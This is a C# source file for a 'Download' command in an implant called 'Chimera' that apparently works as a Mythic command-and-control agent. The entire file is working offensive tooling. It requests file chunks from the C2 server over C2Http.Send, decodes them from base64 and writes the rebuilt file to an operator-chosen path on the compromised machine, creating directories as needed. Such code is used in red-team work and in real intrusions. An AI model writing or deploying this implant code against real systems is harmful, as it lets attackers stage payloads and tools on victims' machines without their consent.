using System;
using System.IO;
using System.Text;

namespace Chimera.Commands
{
    public static class Download
    {
        public static string Execute(string parameters, string taskID, string callbackUUID)
        {
            try
            {
                // Parameters format: {"remote_path":"C:\\path\\to\\file","file_id":"<id>"}
                string remotePath = Tasking.ExtractJsonValue(parameters, "remote_path");
                string fileID     = Tasking.ExtractJsonValue(parameters, "file_id");

                if (string.IsNullOrEmpty(remotePath))
                    return "[error] No remote_path specified";
                if (string.IsNullOrEmpty(fileID))
                    return "[error] No file_id from Mythic";

                int chunkNum    = 1;
                int totalChunks = 1;
                var fileBytes   = new System.Collections.Generic.List<byte>();

                while (chunkNum <= totalChunks)
                {
                    // Request next chunk from Mythic
                    string json = $@"{{
                        ""action"": ""post_response"",
                        ""uuid"": ""{callbackUUID}"",
                        ""responses"": [{{
                            ""task_id"": ""{taskID}"",
                            ""download"": {{
                                ""chunk_num"": {chunkNum},
                                ""file_id"": ""{fileID}"",
                                ""full_path"": ""{remotePath.Replace("\\", "\\\\")}""
                            }}
                        }}]
                    }}";

                    string response = C2Http.Send(json);
                    if (response == null)
                        return "[error] No response from Mythic";

                    // On first chunk, get total count
                    if (chunkNum == 1)
                    {
                        string totalStr = Tasking.ExtractJsonValue(response, "total_chunks");
                        if (!string.IsNullOrEmpty(totalStr))
                            int.TryParse(totalStr, out totalChunks);
                    }

                    string chunkData = Tasking.ExtractJsonValue(response, "chunk_data");
                    if (string.IsNullOrEmpty(chunkData))
                        return "[error] Empty chunk data";

                    byte[] chunkBytes = Convert.FromBase64String(chunkData);
                    fileBytes.AddRange(chunkBytes);
                    chunkNum++;
                }

                // Write file to disk
                string dir = Path.GetDirectoryName(remotePath);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                    Directory.CreateDirectory(dir);

                File.WriteAllBytes(remotePath, fileBytes.ToArray());
                return $"[+] Downloaded to {remotePath} ({fileBytes.Count} bytes)";
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }
    }
}
